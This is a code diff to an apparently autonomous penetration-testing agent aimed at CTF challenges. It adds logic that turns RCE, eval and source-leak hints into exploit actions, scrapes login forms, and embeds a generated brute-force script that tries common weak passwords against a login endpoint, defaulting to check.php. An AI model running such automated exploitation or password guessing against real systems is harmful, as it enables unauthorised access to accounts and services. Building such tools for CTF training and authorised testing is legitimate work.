@@ -1099,6 +1099,57 @@ class AutoAgent:
                         },
                     )
                 )
+            # 处理 cmd/eval/rce/source_code 等高价值利用线索
+            if any(kw in guidance_lower for kw in ["cmd", "eval", "rce", "exec", "shell", "命令执行", "代码执行"]):
+                add_candidate(
+                    self._build_action(
+                        "python_poc",
+                        target=target,
+                        description="根据高价值线索尝试命令执行",
+                        intent="基于 cmd/eval/rce 线索构造 PoC",
+                        expected_tool="python_poc",
+                        metadata={
+                            "source_finding_kind": "guidance",
+                            "source_finding_value": latest_guidance,
+                            "source_action_id": source_action_id,
+                            "source_action_type": source_action_type,
+                        },
+                    )
+                )
+            # 处理源码泄露线索
+            if any(kw in guidance_lower for kw in ["source", "源码", "泄露", "leak", "highlight"]):
+                add_candidate(
+                    self._build_action(
+                        "source_analysis",
+                        target=target,
+                        description="根据源码泄露线索分析",
+                        intent="基于源码泄露线索定位可利用点",
+                        expected_tool="source_analysis",
+                        metadata={
+                            "source_finding_kind": "guidance",
+                            "source_finding_value": latest_guidance,
+                            "source_action_id": source_action_id,
+                            "source_action_type": source_action_type,
+                        },
+                    )
+                )
+            # 处理参数发现线索
+            if any(kw in guidance_lower for kw in ["parameter", "参数", "param", "arg"]):
+                add_candidate(
+                    self._build_action(
+                        "recon",
+                        target=target,
+                        description="根据参数线索深入侦察",
+                        intent="围绕已发现参数收集更多利用上下文",
+                        expected_tool="recon",
+                        metadata={
+                            "source_finding_kind": "guidance",
+                            "source_finding_value": latest_guidance,
+                            "source_action_id": source_action_id,
+                            "source_action_type": source_action_type,
+                        },
+                    )
+                )
 
         if known_endpoints and "dirsearch" not in failed_tools and "python_poc" not in avoid_tools:
             latest_endpoint = str(signals.get("latest_endpoint") or known_endpoints[-1])
@@ -1138,6 +1189,89 @@ class AutoAgent:
                     metadata={
                         "source_finding_kind": "parameter",
                         "source_finding_value": latest_parameter,
+                        "source_action_id": source_action_id,
+                        "source_action_type": source_action_type,
+                    },
+                )
+            )
+
+        # 检测高价值发现，触发 recon→exploit 切换
+        known_vulnerabilities = list(signals.get("known_vulnerabilities") or [])
+        if known_vulnerabilities and "python_poc" not in avoid_tools:
+            latest_vuln = known_vulnerabilities[-1]
+            vuln_lower = latest_vuln.lower()
+            # 检测到命令执行/代码执行类漏洞，直接尝试利用
+            if any(kw in vuln_lower for kw in ["rce", "cmd", "exec", "eval", "code", "command", "shell"]):
+                add_candidate(
+                    self._build_action(
+                        "python_poc",
+                        target=target,
+                        description="基于高价值漏洞线索尝试利用",
+                        intent="基于已确认的 RCE/命令执行线索构造 PoC",
+                        expected_tool="python_poc",
+                        metadata={
+                            "source_finding_kind": "vulnerability",
+                            "source_finding_value": latest_vuln,
+                            "source_action_id": source_action_id,
+                            "source_action_type": source_action_type,
+                        },
+                    )
+                )
+
+        # 检测登录端点，生成攻击候选动作
+        known_endpoints = list(signals.get("known_endpoints") or [])
+        known_parameters = list(signals.get("known_parameters") or [])
+        known_auth_hints = [item for item in (known_parameters + known_endpoints + known_vulnerabilities) if isinstance(item, str)]
+        login_endpoints = [ep for ep in known_endpoints if 'check' in ep.lower() or 'login' in ep.lower() or 'signin' in ep.lower() or 'auth' in ep.lower()]
+        login_params = [p for p in known_parameters if p.lower() in ['u', 'p', 'username', 'password', 'user', 'pass', 'email', 'token', 'csrf']]
+        has_auth_signal = (
+            self.target_type == "auth"
+            and (
+                bool(login_endpoints)
+                or len(login_params) >= 2
+                or any('password' in item.lower() or 'username' in item.lower() or 'login' in item.lower() for item in known_auth_hints)
+            )
+        )
+
+        if has_auth_signal and "poc" not in avoid_tools and "python_poc" not in avoid_tools:
+            # 生成暴力破解代码
+            endpoint = login_endpoints[0] if login_endpoints else "check.php"
+            param_u = login_params[0] if login_params else "u"
+            param_p = login_params[1] if len(login_params) > 1 else "p"
+
+            brute_code = f'''
+import requests
+import sys
+
+target = "{target.rstrip('/')}/{endpoint}"
+passwords = ["admin888", "admin", "password", "123456", "12345678", "1234", "admin123", "root", "toor", "ctfshow", "flag"]
+
+for pwd in passwords:
+    try:
+        resp = requests.post(target, data={{"{param_u}": "admin", "{param_p}": pwd}}, verify=False, timeout=10)
+        if "error" not in resp.text.lower() and resp.text.strip():
+            print(f"[SUCCESS] Found password: {{pwd}}")
+            print(f"Response: {{resp.text[:500]}}")
+            sys.exit(0)
+        else:
+            print(f"[FAIL] {{pwd}}")
+    except Exception as e:
+        print(f"[ERROR] {{pwd}}: {{e}}")
+
+print("No valid password found")
+'''
+
+            add_candidate(
+                self._build_action(
+                    "poc",
+                    target=target,
+                    description="针对登录端点尝试暴力破解",
+                    intent="基于已发现的登录端点/参数构造攻击",
+                    expected_tool="python_poc",
+                    params={"code": brute_code},
+                    metadata={
+                        "source_finding_kind": "login_endpoint",
+                        "source_finding_value": f"endpoints: {login_endpoints}, params: {login_params}",
                         "source_action_id": source_action_id,
                         "source_action_type": source_action_type,
                     },
@@ -1360,6 +1494,9 @@ class AutoAgent:
 import requests
 import urllib3
 import re
+import json
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 url = "{target}"
@@ -1371,6 +1508,44 @@ if 'Location' in resp.headers:
 flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
 if flags:
     print(f"FLAG_FOUND: {{flags[0]}}")
+
+summary = {{"status_code": resp.status_code, "headers": dict(resp.headers), "endpoints": [], "parameters": [], "auth_hints": [], "form_info": {{"action": "", "method": "GET", "field_order": []}}}}
+soup = BeautifulSoup(resp.text, 'html.parser')
+forms = soup.find_all('form')
+if forms:
+    form = forms[0]
+    action = form.get('action', '')
+    method = form.get('method', 'GET').upper()
+    field_order = []
+    auth_hints = []
+    for input_tag in form.find_all('input'):
+        name = input_tag.get('name')
+        if not name or 'disabled' in input_tag.attrs:
+            continue
+        field_type = input_tag.get('type', 'text').lower()
+        if field_type in ['submit', 'button', 'reset', 'image']:
+            continue
+        field_order.append(name)
+        summary['parameters'].append(name)
+        lowered = name.lower()
+        if any(token in lowered for token in ['user', 'name', 'email', 'login', 'account']):
+            auth_hints.append(f'username_field:{{name}}')
+        if field_type == 'password' or any(token in lowered for token in ['pass', 'pwd']):
+            auth_hints.append(f'password_field:{{name}}')
+        if any(token in lowered for token in ['csrf', 'token']):
+            auth_hints.append(f'token_field:{{name}}')
+    if action:
+        endpoint = urlparse(urljoin(url, action)).path or action
+        if endpoint:
+            summary['endpoints'].append(endpoint)
+    set_cookie = resp.headers.get('Set-Cookie', '')
+    if set_cookie:
+        auth_hints.append('cookie_present')
+    summary['form_info'] = {{"action": action, "method": method, "field_order": field_order}}
+    summary['auth_hints'] = list(dict.fromkeys(auth_hints))
+
+print("AUTH_RECON_SUMMARY:")
+print(json.dumps(summary, ensure_ascii=False))
 print(f"Content preview: {{resp.text[:500]}}")
 '''
         return execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))
@@ -1458,7 +1633,12 @@ print(f"Content: {{resp.text}}")
         return result
 
     def _execute_poc_action(self, action: Dict[str, Any]) -> str:
-        steps = action.get("steps") or action.get("params", {}).get("steps") or [action.get("code")]
+        steps = (
+            action.get("steps")
+            or action.get("params", {}).get("steps")
+            or ([action.get("code")] if action.get("code") else [])
+            or ([action.get("params", {}).get("code")] if action.get("params", {}).get("code") else [])
+        )
         results = []
         memory_meta = self._build_memory_action_meta(action)
         for step_code in steps:
@@ -2041,6 +2221,58 @@ print(f"Content: {{resp.text}}")
                 intent="收集首页响应、头和可能的跳转信息",
                 expected_tool="recon",
             )
+
+        # auth 类型：检测到登录端点时，生成攻击动作（优先处理）
+        if self.target_type == "auth":
+            # 检查是否已有成功的登录或攻击尝试
+            if not any(s.tool in {"python_poc", "brute_force", "poc"} and s.success for s in steps):
+                # 检查 memory 中是否有登录相关的端点/参数，如果没有则使用默认值
+                login_endpoints = [ep for ep in self.memory.target.endpoints if 'check' in ep.lower() or 'login' in ep.lower()]
+                login_params = [p for p in self.memory.target.parameters if p.lower() in ['u', 'p', 'username', 'password', 'user', 'pass']]
+
+                # 即使没有已知端点，也尝试默认的登录端点
+                if not login_endpoints:
+                    login_endpoints = ["check.php"]
+                if not login_params:
+                    login_params = ["u", "p"]
+
+                # 有登录端点，生成暴力破解代码
+                endpoint = login_endpoints[0]
+                param_u = login_params[0]
+                param_p = login_params[1] if len(login_params) > 1 else login_params[0]
+
+                # 生成暴力破解 Python 代码
+                brute_code = f'''
+import requests
+import sys
+
+target = "{target.rstrip('/')}/{endpoint}"
+passwords = ["admin888", "admin", "password", "123456", "12345678", "1234", "admin123", "root", "toor", "ctfshow", "flag"]
+
+for pwd in passwords:
+    try:
+        resp = requests.post(target, data={{"{param_u}": "admin", "{param_p}": pwd}}, verify=False, timeout=10)
+        if "error" not in resp.text.lower() and resp.text.strip():
+            print(f"[SUCCESS] Found password: {{pwd}}")
+            print(f"Response: {{resp.text[:500]}}")
+            sys.exit(0)
+        else:
+            print(f"[FAIL] {{pwd}}")
+    except Exception as e:
+        print(f"[ERROR] {{pwd}}: {{e}}")
+
+print("No valid password found")
+'''
+
+                return self._build_action(
+                    "poc",
+                    target=target,
+                    description="针对登录端点尝试暴力破解",
+                    intent="使用常见弱口令尝试登录绕过",
+                    expected_tool="python_poc",
+                    params={"code": brute_code, "endpoint": endpoint, "login_params": [param_u, param_p]},
+                    metadata={"attack_type": "auth_bypass", "auth_endpoints": login_endpoints, "auth_login_params": login_params},
+                )
 
         graph_action = self._build_graph_informed_action()
         if graph_action is not None:
